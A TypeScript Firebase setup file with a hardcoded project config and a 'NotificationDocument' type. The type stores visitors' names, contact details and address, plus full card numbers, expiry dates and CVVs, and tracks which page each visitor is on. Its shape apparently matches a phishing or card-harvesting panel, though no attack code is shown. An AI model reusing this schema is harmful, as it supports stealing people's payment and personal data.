import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: 'AIzaSyAtao5yn3yKnQk09yfW7DLD9k4Fk_umdHY',
  authDomain: 'sasasas-7fa2b.firebaseapp.com',
  projectId: 'sasasas-7fa2b',
  storageBucket: 'sasasas-7fa2b.firebasestorage.app',
  messagingSenderId: '677535894583',
  appId: '1:677535894583:web:02178b3061e21d92da43b2',
  measurementId: 'G-ZEYXJ20D6D',
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
